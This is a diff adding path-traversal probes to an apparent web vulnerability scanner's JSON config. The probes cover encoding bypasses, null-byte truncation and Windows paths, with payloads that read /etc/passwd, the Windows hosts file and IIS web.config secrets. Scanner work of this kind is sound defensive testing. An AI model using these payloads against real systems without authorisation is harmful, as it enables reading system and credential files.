@@ -104,6 +104,117 @@
           "variables": {}
         }
       ]
+    },
+    "encoding_bypass": {
+      "description": "Path traversal filter bypasses using double encoding, overlong UTF-8, and mixed-separator tricks from HackTricks",
+      "tech_match": ["Apache", "Nginx", "PHP", "Tomcat", "Java"],
+      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
+      "probes": [
+        {
+          "payload": "%252e%252e%252fetc/passwd",
+          "description": "Double URL-encoded traversal — %25 decodes to %, then second pass decodes %2e to . and %2f to /",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "..%c0%afetc/passwd",
+          "description": "Overlong UTF-8 encoding of / (0xc0 0xaf) — bypasses decoders that only check standard %2f",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "....//....//....//etc/passwd",
+          "description": "Double-dot double-slash bypass — after stripping ../ the remaining ../  still traverses",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "..;/etc/passwd",
+          "description": "Semicolon bypass targeting Tomcat — Tomcat treats semicolon as path parameter separator, allowing traversal past it",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "..\\/etc/passwd",
+          "description": "Backslash-forward-slash mixed separator — some Windows-ported parsers normalise both separators",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "null_byte": {
+      "description": "Null byte injection for path traversal — terminates strings early to bypass extension and suffix checks",
+      "tech_match": ["PHP", "Apache", "Nginx"],
+      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
+      "probes": [
+        {
+          "payload": "../../../etc/passwd%00.jpg",
+          "description": "Null byte extension bypass — %00 terminates the C string, stripping the .jpg suffix before file open",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "../../../etc/passwd%00",
+          "description": "Null byte path terminator — nullifies any suffix appended by the application after the parameter",
+          "matchers": [
+            {"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "windows_specific": {
+      "description": "Additional Windows-specific path traversal targets — hosts file and IIS web.config",
+      "tech_match": ["IIS", "ASP.NET"],
+      "param_match": ["file", "path", "item", "page", "template", "include", "url", "src", "doc", "dir", "load", "read", "fname"],
+      "probes": [
+        {
+          "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+          "description": "Windows hosts file path traversal — loopback and domain entries confirm read access",
+          "matchers": [
+            {"type": "word", "words": ["127.0.0.1", "localhost"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "..\\..\\..\\inetpub\\wwwroot\\web.config",
+          "description": "IIS web.config traversal — connection strings and app secrets confirm sensitive file read",
+          "matchers": [
+            {"type": "word", "words": ["connectionString", "appSettings", "<configuration>"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
     }
   }
 }
